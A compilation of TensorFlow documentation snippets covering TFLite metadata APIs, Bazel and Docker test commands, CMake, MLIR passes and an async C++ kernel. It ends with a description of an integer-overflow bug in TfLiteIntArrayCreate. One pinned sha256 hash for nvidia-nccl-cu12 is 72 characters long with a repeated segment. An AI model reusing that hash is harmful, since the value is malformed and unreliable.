DESCRIPTION: This class method initializes a `BertTokenizerOptionsT` object from a buffer containing packed data. It takes the buffer (`buf`) and an optional starting position (`pos`, defaulting to 0) as input. This method is similar to `InitFromBuf` but may handle specific 'packed' serialization formats.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptionsT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Initializing TensorGroupT from Object Python
DESCRIPTION: A class method to initialize a `TensorGroupT` object from an existing `tensorGroup` object. This can be used for copying or converting between object representations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroupT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    tensorGroup
)
```

----------------------------------------

TITLE: Get Standard Deviation Values as NumPy Array Python
DESCRIPTION: This method retrieves the entire array of standard deviation values associated with the normalization options. It returns the values as a NumPy array for convenient numerical processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptions.md#_snippet_9

LANGUAGE: Python
CODE:
```
StdAsNumpy()
```

----------------------------------------

TITLE: Implementing Async Sleep Op Kernel Class (C++)
DESCRIPTION: Defines the `AsyncSleepOp` class derived from `tensorflow::AsyncOpKernel`. It implements the `ComputeAsync` method to handle the asynchronous operation logic and manages the `DoneCallback` to signal completion. The constructor initializes the base class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_5

LANGUAGE: C++
CODE:
```
class AsyncSleepOp : public AsyncOpKernel {
 public:
  explicit AsyncSleepOp(OpKernelConstruction* ctx) : AsyncOpKernel(ctx) {}
  AsyncSleepOp(const AsyncSleepOp& other) = delete;
  AsyncSleepOp& operator=(const AsyncSleepOp& other) = delete;
  ~AsyncSleepOp() override = default;

  // Implementations of ComputeAsync() must ensure that `done` is (eventually)
  // called exactly once to signal the completion of the computation. The
  // implementation of ComputeAsync() must not block on the execution of another
  // OpKernel. `done` may be called by the current thread, or by another thread.
  // `context` is guaranteed to stay alive until the `done` callback starts.
  // For example, use OP_REQUIRES_ASYNC which takes the `done` parameter
  // as an input and calls `done` for the case of exiting early with an error
  // (instead of OP_REQUIRES).
  //
  // Since it is possible that the unblocking kernel may never run (due to an
  // error or cancellation), in most cases the AsyncOpKernel should implement
  // cancellation support via `context->cancellation_manager()`.
  // TODO (schwartzedward): should this use cancellation support?
  //
  // WARNING: As soon as the `done` callback starts, `context` and `this` may be
  // deleted. No code depending on these objects should execute after the call
  // to `done`.
  void ComputeAsync(OpKernelContext* ctx, DoneCallback done) override {
    const auto& delay_tensor = ctx->input(0);
    OP_REQUIRES_ASYNC(
        ctx, ::tensorflow::TensorShapeUtils::IsScalar(delay_tensor.shape()),
        InvalidArgument("Input `delay` must be a scalar."),
        done);  // Important: call `done` in every execution path
    const float delay = delay_tensor.flat<float>()(0);
    OP_REQUIRES_ASYNC(ctx, delay >= 0.0,
                      InvalidArgument("Input `delay` must be non-negative."),
                      done);  // Important: call `done` in every execution path
    auto thread_pool = ctx->device()->tensorflow_cpu_worker_threads()->workers;
    OP_REQUIRES_ASYNC(ctx, thread_pool != nullptr,
                      Internal("No thread_pool found."),
                      done);  // Important: call `done` in every execution path

    Tensor* output_tensor = nullptr;
    OP_REQUIRES_OK_ASYNC(
        ctx, ctx->allocate_output(0, delay_tensor.shape(), &output_tensor),
        done);  // Important: call `done` in every execution path

    absl::Time now = absl::Now();
    absl::Time when = now + absl::Seconds(delay);
    VLOG(1) << "BEFORE ASYNC SLEEP " << ctx->op_kernel().name() << " now "
            << now << " when " << when;
    thread_pool->Schedule([this, output_tensor, when, done] {
      this->sleeper(output_tensor, when, done);
    });
    // Note that `done` is normally called by sleeper(), it is not normally
    // called by this function.
  }

 private:
  void sleeper(Tensor* output_tensor, absl::Time when, DoneCallback done) {
    absl::Time now = absl::Now();
    int64_t delay_us = 0;
    if (now < when) {
      delay_us = absl::ToInt64Microseconds(when - now);
      VLOG(1) << "MIDDLE ASYNC SLEEP " << delay_us;
      absl::SleepFor(when - now);
      VLOG(1) << "AFTER ASYNC SLEEP " << delay_us;
    } else {
      VLOG(1) << "MIDDLE/AFTER ASYNC SKIP SLEEP";
    }
    auto output = output_tensor->template flat<float>();
    output(0) = static_cast<float>(delay_us) / 1000000.0;
    done();  // Important: call `done` in every execution path
  }
};
```

----------------------------------------

TITLE: Including TFLite Micro Test Framework Header (C++)
DESCRIPTION: Includes the header file for the TensorFlow Lite for Microcontrollers unit testing framework. This header provides macros and utilities necessary for defining and running micro-level unit tests for model inference and library components.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_2

LANGUAGE: C++
CODE:
```
#include "tensorflow/lite/micro/testing/micro_test.h"
```

----------------------------------------

TITLE: Running TensorFlow Nonpip Tests with Bazel Bash
DESCRIPTION: Executes TensorFlow's Nonpip test suite using Bazel inside the Docker container. The --config=nonpip flag runs the standard set of tests included in the nightly DevInfra pipeline; different configurations for CPU/GPU and cache are supported via bazelrc and config flags.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_10

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/cpu.bazelrc \
test --config=sigbuild_remote_cache \
--config=nonpip
```

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/gpu.bazelrc \
test --config=sigbuild_remote_cache \
--config=nonpip
```

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/cpu.bazelrc \
test --config=sigbuild_local_cache \
--config=nonpip
```

LANGUAGE: Bash
CODE:
```
docker exec tf \
bazel --bazelrc=/usertools/gpu.bazelrc \
test --config=sigbuild_local_cache \
--config=nonpip
```

----------------------------------------

TITLE: Pinning Python Test Dependencies
DESCRIPTION: This section lists dependencies required specifically for running TensorFlow's Python tests. It includes `grpcio`, `portpicker`, and `scipy`, with `scipy` conditionally pinned based on the Python version similar to NumPy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/ci_build/release/requirements_common.txt#_snippet_4

LANGUAGE: Python
CODE:
```
grpcio ~= 1.59.0 # Earliest version for Python 3.12
```

LANGUAGE: Python
CODE:
```
portpicker ~= 1.6.0
```

LANGUAGE: Python
CODE:
```
scipy ~= 1.7.2; python_version < '3.11'
```

LANGUAGE: Python
CODE:
```
scipy ~= 1.9.2; python_version == '3.11' # Earliest version for Python 3.11
```

LANGUAGE: Python
CODE:
```
scipy ~= 1.11.3; python_version >= '3.12' # Earliest version for Python 3.12
```

----------------------------------------

TITLE: Run a Custom hlo-opt Pass Example
DESCRIPTION: This command demonstrates running a newly registered custom HLO pass (`foo-pass`) on an input HLO file using `hlo-opt`. This is part of the pass development workflow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_18

LANGUAGE: Bash
CODE:
```
hlo-opt --passes=foo-pass input.hlo
```

----------------------------------------

TITLE: Specifying Include Directories for label_image (CMake)
DESCRIPTION: Adds necessary include directories (`label_image` and the CMake binary directory) for compiling the `label_image` target, making them publicly available to dependent targets if this were a library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/CMakeLists.txt#_snippet_5

LANGUAGE: cmake
CODE:
```
include_directories(label_image
  PUBLIC
  ${CMAKE_BINARY_DIR}
)
```

----------------------------------------

TITLE: Generating Constant Lookup Table Tensor (MLIR Utility)
DESCRIPTION: This function generates a constant tensor representing a lookup table. It takes a function `func` and applies it to integer inputs ranging from -256 to 256, storing the results in an array. This array is then used to create a TOSA CONST operation, producing a constant tensor that can be used within the MLIR graph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_31

LANGUAGE: MLIR
CODE:
```
Value get_table_const_tensor(function func)
{
    array<int16, 513> table_array;
    for (int32 i = -256; i <= 256; i++) {
        table_array[i] = func(i);
    }

    return tosa.CONST() {value=table_array};
}
```

----------------------------------------

TITLE: Comparing TFLite Pos Objects in Python
DESCRIPTION: Compares this `Pos` object with another object for equality. It checks if the provided `other` object is equal to the current `Pos` instance based on its content.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/Pos.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other: Any
) -> bool

```

----------------------------------------

TITLE: Setting Up Virtual Environment for Pip Tests Bash
DESCRIPTION: Runs a script inside the Docker container to create a Python virtual environment and install the newly built TensorFlow nightly wheel package into it, preparing for Pip tests.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_8

LANGUAGE: Bash
CODE:
```
docker exec tf /usertools/setup_venv_test.sh bazel_pip "/tf/pkg/tf_nightly*.whl"
```

----------------------------------------

TITLE: Building Sample Delegate for Linux Host Benchmark (Bash)
DESCRIPTION: Builds the TensorFlow Lite sample stable delegate shared library for the Linux host using Bazel, creating a library file that can be loaded dynamically by host tools.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_6

LANGUAGE: bash
CODE:
```
bazel build -c opt //tensorflow/lite/delegates/utils/experimental/sample_stable_delegate:tensorflowlite_sample_stable_delegate
```

----------------------------------------

TITLE: Pushing Evaluation Binary to Android via ADB Shell
DESCRIPTION: This ADB command pushes the built `run_eval` binary from the Bazel output directory on the host machine to a temporary directory (`/data/local/tmp`) on the connected Android device. Ensure the target directory exists on the device before pushing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification/README.md#_snippet_2

LANGUAGE: Shell
CODE:
```
adb push bazel-bin/tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification/run_eval /data/local/tmp
```

----------------------------------------

TITLE: Stopping Docker Container Bash
DESCRIPTION: Sends a stop signal to the specified Docker container ('tf'), allowing it to shut down gracefully.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_15

LANGUAGE: Bash
CODE:
```
docker stop tf
```

----------------------------------------

TITLE: Checking Equality for ImageSearcherOptions in Python
DESCRIPTION: Defines the equality method (`__eq__`) for the `ImageSearcherOptions` class. This method is used to compare two `ImageSearcherOptions` objects to determine if they are equal.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageSearcherOptions.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other
)
```

----------------------------------------

TITLE: Executing Bazel Tests (Bazel)
DESCRIPTION: This Bazel command compiles and runs the specified `test_targets`. It is used in the CI workflows that include both compilation and execution of tests.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/readme.md#_snippet_3

LANGUAGE: Bazel
CODE:
```
bazel test ... test_targets
```

----------------------------------------

TITLE: Run Bazel Tests JAX CPU (Shell)
DESCRIPTION: Executes `bazel test` for JAX CPU targets. It applies specific build and test tag filters, uses the RBE configuration, sets JAX environment variables, overrides the Python version and XLA repository, and configures output and profiling options. It's set to keep going on failures and attempt flaky tests multiple times.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_1

LANGUAGE: shell
CODE:
```
bazel test --build_tag_filters= --test_tag_filters= --config=rbe_linux_x86_64 --test_env=JAX_NUM_GENERATED_CASES=25 --test_env=JAX_SKIP_SLOW_TESTS=1 --repo_env=HERMETIC_PYTHON_VERSION=3.12 --override_repository=xla=$GITHUB_WORKSPACE/openxla/xla --color=yes --test_output=errors --verbose_failures --keep_going --nobuild_tests_only --profile=profile.json.gz --flaky_test_attempts=3 --jobs=150 --bes_upload_mode=fully_async -- //tests:cpu_tests //tests:backend_independent_tests
```

----------------------------------------

TITLE: Implementing SimpleHardware Interface (C++)
DESCRIPTION: Demonstrates how to define a custom hardware backend by inheriting from `SimpleHardware`. It shows methods for providing MLIR rewrite patterns for transformations, defining a unique type ID, specifying unsupported operations, and setting a performance metric relative to CPU. Required base class: `SimpleHardware`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/lite/experimental/tac/README.md#_snippet_1

LANGUAGE: C++
CODE:
```
class FooHardware : public SimpleHardware {
 public:
  static constexpr char kId[] = "FOO";

  mlir::RewritePatternSet GetTransformations(
      MLIRContext* context) const override {
    mlir::RewritePatternSet patterns;
    // Pick the transformations that we want to perform,
    // We can add other transformations we like here.
    patterns.add<LowerPackIntoConcatReshape, UnrollSplit, UnrollSplitV,
                  PadSlice>(context);
    return patterns;
  }

  mlir::TypeID GetTypeId() const override {
    return mlir::TypeID::get<FooHardware>();
  }

  // We can specify what ops are not supported here.
  bool IsNotSupportedOp(mlir::Operation* op) const override { return false; }

  // This is basically saying how fast are we comparing to CPU.
  // The larger the value the better.
  float AdvantageOverCPU() const override { return 5.0; }
};
```

----------------------------------------

TITLE: Executing Filtered Stable Delegate Test Suite on Android (Bash)
DESCRIPTION: Runs the stable delegate test suite on the Android device, similar to the previous command, but includes the --gunit_filter flag to specify a subset of tests to run (e.g., excluding certain tests).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_5

LANGUAGE: bash
CODE:
```
adb shell "/data/local/tmp/stable_delegate_test_suite \
  --stable_delegate_settings_file=/data/local/tmp/stable_delegate_settings.json \
  --acceleration_test_config_path=/data/local/tmp/stable_delegate_acceleration_test_config.json \
  --gunit_filter=-TestA:TestB:TestC"
```

----------------------------------------

TITLE: Running TensorFlow Java Example with Bazel (Shell)
DESCRIPTION: Demonstrates how to use Bazel to build and execute a specific TensorFlow Java example, such as the `label_image` application. This command handles both the compilation and execution steps directly via the Bazel build system.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/java/LEGACY.md#_snippet_4

LANGUAGE: Shell
CODE:
```
bazel run -c opt //tensorflow/java/src/main/java/org/tensorflow/examples:label_image
```

----------------------------------------

TITLE: Defining nvidia-nccl-cu12 Dependency
DESCRIPTION: Specifies the exact version (2.25.1) for the 'nvidia-nccl-cu12' package and includes multiple SHA256 hashes. This entry defines the required version of the NCCL library for CUDA 12, crucial for multi-GPU communication, and ensures its integrity during installation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_9

LANGUAGE: Python Requirements
CODE:
```
nvidia-nccl-cu12==2.25.1 \
    --hash=sha256:362aed5963fb9ea2ed2f264409baae30143498fd0e5c503aeaa1badd88cdc54a \
    --hash=sha256:4ab428bc915785cc66e8c57cb34c7a64cf739c46cf739c46702b8db748b6ad6cc7180cf8
```

----------------------------------------

TITLE: Packing RegexTokenizerOptionsT into Builder Python
DESCRIPTION: Packs the current `RegexTokenizerOptionsT` object into a FlatBuffer builder. This method is used to serialize the object's state into a buffer format suitable for TFLite metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptionsT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Accessing Input Process Units in Python
DESCRIPTION: Accesses a specific entry in the list of input process units. This method allows retrieval of input process unit configurations by their index.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_10

LANGUAGE: python
CODE:
```
InputProcessUnits(
    j
)
```

----------------------------------------

TITLE: Initializing ContentT From Packed Buffer in Python
DESCRIPTION: Initializes a ContentT object from a packed buffer, optionally specifying a starting position. This class method is likely used for deserializing data from a specific packed format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ContentT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Checking for Output Process Units in Python
DESCRIPTION: Checks if the output process units field is present or null within the schema. Use this method to verify if output process units exist.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_21

LANGUAGE: python
CODE:
```
OutputProcessUnitsIsNone()
```

----------------------------------------

TITLE: Initial Kernel after Inlining - MLIR
DESCRIPTION: This snippet shows the main function of a GPU kernel after the inlining pass. It uses XLA GPU and standard GPU dialects to define thread and block IDs, and a custom xla_gpu.loop operation to perform element-wise computations on a high-dimensional tensor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/emitters.md#_snippet_1

LANGUAGE: MLIR
CODE:
```
func.func @main(%arg0: tensor<6x512x4096xbf16>, %arg1: tensor<6x512x4096xbf16>) -> tensor<6x512x4096xbf16> {
 ...
  %thread_id_x = gpu.thread_id  x {xla.range = [0 : index, 127 : index]}
  %block_id_x = gpu.block_id  x {xla.range = [0 : index, 24575 : index]}

  %xla_loop = xla_gpu.loop (%thread_id_x, %block_id_x)[%vector_index] -> (%dim0, %dim1, %dim2)
      in #map iter_args(%iter = %output) -> (tensor<6x512x4096xbf16>) {
    %extracted = tensor.extract %input[%dim0, %dim1, %dim2] : tensor<6x512x4096xbf16>
    %0 = arith.mulf %extracted, %extracted : bf16
    %1 = arith.mulf %0, %extracted : bf16
    %2 = arith.mulf %1, %cst : bf16
    %3 = arith.addf %extracted, %2 : bf16
    %4 = arith.mulf %3, %cst_0 : bf16
    %5 = math.tanh %4 : bf16
    %6 = arith.addf %5, %cst_1 : bf16
    %7 = arith.mulf %6, %cst_2 : bf16
    %8 = arith.mulf %extracted, %7 : bf16
    %inserted = tensor.insert %8 into %iter[%dim0, %dim1, %dim2] : tensor<6x512x4096xbf16>
    xla_gpu.yield %inserted : tensor<6x512x4096xbf16>
  }
  return %xla_loop : tensor<6x512x4096xbf16>
}
```

----------------------------------------

TITLE: Pinning NumPy Dependency by Python Version
DESCRIPTION: NumPy is a critical dependency, and its compatible version is conditionally pinned based on the Python interpreter version to ensure compatibility with specific Python releases (3.10, 3.11, and 3.12+). This supports broader compatibility across different build environments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/ci_build/release/requirements_common.txt#_snippet_1

LANGUAGE: Python
CODE:
```
numpy ~= 1.22.0; python_version < '3.11'
```

LANGUAGE: Python
CODE:
```
numpy ~= 1.23.2; python_version == '3.11' # Earliest version for Python 3.11
```

LANGUAGE: Python
CODE:
```
numpy ~= 1.26.0; python_version >= '3.12' # Earliest version for Python 3.12
```

----------------------------------------

TITLE: Configuring TFLite GPU Delegate CMake
DESCRIPTION: This block configures the TFLite GPU delegate when the `TFLITE_ENABLE_GPU` option is enabled. It finds required header packages (OpenCL, Vulkan, fp16, and OpenGL/EGL unless on Android), populates source lists for various GPU components using `populate_tflite_source_vars` with filters, and appends these component source lists along with specific delegate files to the main `TFLITE_DELEGATES_GPU_SRCS` list.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_28

LANGUAGE: CMake
CODE:
```
if(TFLITE_ENABLE_GPU)
  find_package(opencl_headers REQUIRED)
  find_package(vulkan_headers REQUIRED)
  find_package(fp16_headers REQUIRED)
  # Android NDK already has OpenGL, EGL headers.
  if(NOT "${CMAKE_SYSTEM_NAME}" STREQUAL "Android")
    find_package(opengl_headers REQUIRED)
    find_package(egl_headers REQUIRED)
  endif()
  populate_tflite_source_vars(
    "delegates/gpu/cl" TFLITE_DELEGATES_GPU_CL_SRCS
    FILTER "(_test|gl_interop|gpu_api_delegate|egl_sync)\\.(cc|h)$"
  )
  populate_tflite_source_vars(
    "delegates/gpu/cl/default" TFLITE_DELEGATES_GPU_CL_DEFAULT_SRCS
    FILTER "(_test)\\.(cc|h)$"
  )
  populate_tflite_source_vars(
    "delegates/gpu/cl/kernels" TFLITE_DELEGATES_GPU_CL_KERNELS_SRCS
    FILTER "(_test)\\.(cc|h)$"
  )
  populate_tflite_source_vars(
    "delegates/gpu/common/default" TFLITE_DELEGATES_GPU_COMMON_DEFAULT_SRCS
    FILTER "(_test)\\.(cc|h)$"
  )
  populate_tflite_source_vars(
    "delegates/gpu/common/memory_management"
    TFLITE_DELEGATES_GPU_COMMON_MEMORY_MANAGEMENT_SRCS
    FILTER "(_test)\\.(cc|h)$"
  )
  populate_tflite_source_vars(
    "delegates/gpu/common/selectors" TFLITE_DELEGATES_GPU_COMMON_SELECTORS_SRCS
    FILTER "(_test)\\.(cc|h)$"
  )
  populate_tflite_source_vars(
    "delegates/gpu/common/selectors/default" TFLITE_DELEGATES_GPU_COMMON_SELECTORS_DEFAULT_SRCS
    FILTER "(_test)\\.(cc|h)$"
  )
  populate_tflite_source_vars(
    "delegates/gpu/common" TFLITE_DELEGATES_GPU_COMMON_SRCS
    FILTER "(_test)\\.(cc|h)$"
  )
  populate_tflite_source_vars(
    "delegates/gpu/common/task"
    TFLITE_DELEGATES_GPU_COMMON_TASK_SRCS
    FILTER "(_test)\\.(cc|h)$"
  )
  populate_tflite_source_vars(
    "delegates/gpu/common/tasks"
    TFLITE_DELEGATES_GPU_COMMON_TASKS_SRCS
    FILTER "(_test)\\.(cc|h)$"
  )
  populate_tflite_source_vars(
    "delegates/gpu/common/tasks/special"
    TFLITE_DELEGATES_GPU_COMMON_TASKS_SPECIAL_SRCS
    FILTER "(_test)\\.(cc|h)$"
  )
  populate_tflite_source_vars(
    "delegates/gpu/common/transformations"
    TFLITE_DELEGATES_GPU_COMMON_TRANSFORMATIONS_SRCS
    FILTER "(_test)\\.(cc|h)$"
  )
  list(APPEND TFLITE_DELEGATES_GPU_SRCS
    ${TFLITE_SOURCE_DIR}/delegates/gpu/api.cc
    ${TFLITE_SOURCE_DIR}/delegates/gpu/delegate.cc
    ${TFLITE_SOURCE_DIR}/delegates/gpu/delegate.h
    ${TFLITE_SOURCE_DIR}/delegates/gpu/delegate_options.cc
    ${TFLITE_SOURCE_DIR}/delegates/gpu/delegate_options.h
    ${TFLITE_SOURCE_DIR}/delegates/gpu/tflite_profile.cc
    ${TFLITE_SOURCE_DIR}/experimental/acceleration/compatibility/android_info.cc
    ${TFLITE_DELEGATES_GPU_CL_SRCS}
    ${TFLITE_DELEGATES_GPU_CL_DEFAULT_SRCS}
    ${TFLITE_DELEGATES_GPU_CL_KERNELS_SRCS}
    ${TFLITE_DELEGATES_GPU_COMMON_DEFAULT_SRCS}
    ${TFLITE_DELEGATES_GPU_COMMON_MEMORY_MANAGEMENT_SRCS}
    ${TFLITE_DELEGATES_GPU_COMMON_SELECTORS_SRCS}
    ${TFLITE_DELEGATES_GPU_COMMON_SELECTORS_DEFAULT_SRCS}
    ${TFLITE_DELEGATES_GPU_COMMON_SRCS}
    ${TFLITE_DELEGATES_GPU_COMMON_TASK_SRCS}
    ${TFLITE_DELEGATES_GPU_COMMON_TASKS_SRCS}
    ${TFLITE_DELEGATES_GPU_COMMON_TASKS_SPECIAL_SRCS}
    ${TFLITE_DELEGATES_GPU_COMMON_TRANSFORMATIONS_SRCS}
    ${TFLITE_SOURCE_DIR}/tools/versioning/gpu_compatibility.cc
    ${TFLITE_SOURCE_DIR}/tools/versioning/op_signature.cc
    ${TF_SOURCE_DIR}/compiler/mlir/lite/tools/versioning/op_signature.cc
  )
  include_directories(
    AFTER
    ${TFLITE_SOURCE_DIR}/delegates/gpu/common
    ${TFLITE_SOURCE_DIR}/delegates/gpu/common/task
  )
```

----------------------------------------

TITLE: Building XLA for CUDA Backend Inside Docker (Linux)
DESCRIPTION: Runs the Bazel build command inside the GPU Docker container to compile the XLA project (`//xla/...`) targeting the CUDA backend. Options include showing all test output and using a sandboxed spawn strategy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/build_from_source.md#_snippet_8

LANGUAGE: shell
CODE:
```
docker exec xla_gpu bazel build --test_output=all --spawn_strategy=sandboxed //xla/...
```

----------------------------------------

TITLE: Set Minimum CMake Version (CMake)
DESCRIPTION: Specifies the minimum required version of CMake to build the project. This ensures that the build system has access to the necessary commands and features. Requires CMake version 3.5 or higher.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
cmake_minimum_required(VERSION 3.5)
```

----------------------------------------

TITLE: Testing the No-Operation Python-to-Python Transpiler
DESCRIPTION: Demonstrates using the `NoopTranspiler`. It defines a simple function `f`, calls the transpiler's `transform` method on `f`, and then executes the resulting transformed function `new_f`. Since it's a no-op transpiler, `new_f` behaves identically to `f`, returning the sum of inputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/pyct_tutorial.ipynb#_snippet_9

LANGUAGE: python
CODE:
```
def f(x, y):
  return x + y


new_f, module, source_map = tr.transform(f, None)

new_f(1, 1)
```

----------------------------------------

TITLE: Initializing From Packed Buffer in TFLite Metadata (Python)
DESCRIPTION: A class method to initialize a `SubGraphMetadataT` object from a packed FlatBuffers buffer. Similar to `InitFromBuf`, this method deserializes the object from a byte buffer but assumes a specific packed format, starting at an optional position. It is used for efficient deserialization of metadata. Takes the buffer and an optional starting position.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataT.md#_snippet_3

LANGUAGE: Python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Convert Flatbuffer Binary to JSON using flatc (Shell)
DESCRIPTION: Use the `flatc` tool with the schema file (`database.fbs`) to convert the binary flatbuffer database file (`gpu_compatibility.bin`) into a human-readable JSON format for editing. The `--raw-binary` option is used because the input is a binary FlatBuffer file, and `--strict-json` enforces strict JSON parsing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/acceleration/compatibility/README.md#_snippet_0

LANGUAGE: shell
CODE:
```
flatc -t --raw-binary --strict-json database.fbs -- gpu_compatibility.bin
```

----------------------------------------

TITLE: Example Bazel Configuration for Android Build
DESCRIPTION: Illustrates the typical entries added to the .tf_configure.bazelrc file after running the ./configure script and specifying Android build settings. These lines set environment variables used by Bazel for locating the Android SDK and NDK.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/lite_build.md#_snippet_5

LANGUAGE: shell
CODE:
```
build --action_env ANDROID_NDK_HOME="/usr/local/android/android-ndk-r25b"
build --action_env ANDROID_NDK_API_LEVEL="21"
build --action_env ANDROID_BUILD_TOOLS_VERSION="30.0.3"
build --action_env ANDROID_SDK_API_LEVEL="30"
build --action_env ANDROID_SDK_HOME="/usr/local/android/android-sdk-linux"
```

----------------------------------------

TITLE: tf.cond with Static Shape Index Out of Bounds Error Python
DESCRIPTION: Illustrates that using `tf.cond` with a condition based on a static shape (`x.shape[0]`) can still lead to tracing errors. Because `tf.cond` traces both branches, the invalid access `x[4]` is detected even though the condition `x.shape[0] >= 4` would be false at runtime. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_35

LANGUAGE: Python
CODE:
```
val = tf.cond(
  x.shape[0] >= 4,
  lambda: x[4],
  lambda: some_default_value)
```

----------------------------------------

TITLE: MLIR Graph After Space-to-Depth RewritePass MLIR
DESCRIPTION: This MLIR snippet illustrates the graph structure after the automatic space-to-depth rewrite pass has been applied. It shows the insertion of a `tf.SpaceToDepth` operation after `tf.IteratorGetNext`. The subsequent `tf_device.launch_func` receives the transformed input, and the convolution within uses a transformed filter (`%filter_transform`) with adjusted strides and shapes, reflecting the optimization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tensorflow/g3doc/space_to_depth.md#_snippet_3

LANGUAGE: MLIR
CODE:
```
// With this pass, the program will be transformed into:
module {
   func @while_body {
     %input = "tf.IteratorGetNext"(...) {device = "/CPU:0"}
               -> tensor<2x224x224x3xf32>
     %space_to_depth = "tf.SpaceToDepth"(%input) {block_size = 2, ...}:
        (tensor<2x224x224x3xf32>) -> tensor<2x112x112x12xf32>
     %device_launch = "tf_device.launch_func"(%space_to_depth,...) {func = @_func,...)
     return ...
   }
   func @_func(%input: tensor<2x112x112x12xf32>,
              %filter: tensor<7x7x3x64xf32>) {
     %filter_transform = "tf.Pad/tf.Transpose/tf.Reshape"(%filter):
       tensor<7x7x3x64xf32>) -> tensor<4x4x12x64xf32>
     %conv = "tf.Conv2D"(%input, %filter_transform) {strides = [1, 1, 1, 1]}:
       (tensor<2x112x112x12xf32>, tensor<4x4x12x64xf32>) ->
       tensor<2x112x112x64xf32>
   }
}
```

----------------------------------------

TITLE: Creating TFLite Int Array - C++
DESCRIPTION: This C++ function allocates memory for a `TfLiteIntArray` using `malloc`, based on the size returned by `TfLiteIntArrayGetSizeInBytes`. If the size calculation from the previous function results in a negative value due to overflow, `malloc` will receive an invalid argument, potentially returning a null or invalid pointer, which is then dereferenced when setting `ret->size`.
